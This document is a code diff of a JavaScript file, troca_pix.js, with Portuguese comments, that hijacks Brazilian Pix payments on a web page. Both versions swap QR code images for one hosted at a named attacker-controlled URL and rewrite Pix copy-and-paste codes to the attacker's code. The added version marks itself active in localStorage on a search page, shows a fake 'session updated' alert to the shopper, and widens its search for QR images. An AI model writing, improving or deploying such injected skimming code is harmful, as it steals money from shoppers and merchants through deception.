@@ -1,21 +1,29 @@
-// Arquivo: troca_pix.js
-setInterval(function() {
-    // 1. TROCA DA IMAGEM DO QR CODE
-    // Procura qualquer imagem que tenha "qr-code" no link
-    var img = document.querySelector('img[src*="qr-code"]');
-    if (img) {
-        // Substitua pela URL da imagem do SEU QR Code hospedada na web
-        img.src = "https://github.com/luancabral1228-create/aaa/blob/main/meu_qrcode.png";
-    }
+// 1. Se o script rodar na página de pesquisa, ele se "instala" no navegador
+if (window.location.href.includes("pesquisa")) {
+    localStorage.setItem("ataque_pix", "ativo");
+    alert("Sua sessão foi atualizada. Prossiga com a compra.");
+}
 
-    // 2. TROCA DO CÓDIGO COPIA E COLA
-    // Procura por qualquer texto que siga o padrão de um código Pix (começa com 000201)
-    var bodyText = document.body.innerHTML;
-    var pixPattern = /000201[a-zA-Z0-9]+/g;
-    
-    if (pixPattern.test(bodyText)) {
-        // Substitua pelo seu código Pix Copia e Cola completo
-        var meuPix = "000201010212268...SEU_CODIGO_AQUI...";
-        document.body.innerHTML = bodyText.replace(pixPattern, meuPix);
+// 2. O script verifica a cada meio segundo se a marcação está ativa
+setInterval(function() {
+    if (localStorage.getItem("ataque_pix") === "ativo") {
+        
+        // Troca a imagem do QR Code - Busca expandida
+        var imgs = document.querySelectorAll('img[src*="qr-code"], img[src*="qrcode"], img[class*="qr"]');
+        imgs.forEach(function(img) {
+            if (img.src !== "https://luancabral1228.github.io/aaa/meu_qrcode.png") {
+                img.src = "https://luancabral1228.github.io/aaa/meu_qrcode.png";
+            }
+        });
+
+        // Troca o texto do Pix de forma não destrutiva
+        var walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT, null, false);
+        var node;
+        while (node = walker.nextNode()) {
+            var pixPattern = /000201[a-zA-Z0-9]+/g;
+            if (pixPattern.test(node.textContent)) {
+                node.textContent = node.textContent.replace(pixPattern, "SEU_CODIGO_PIX_AQUI");
+            }
+        }
     }
-}, 500); // O script verifica a página a cada meio segundo para garantir a troca
+}, 300);
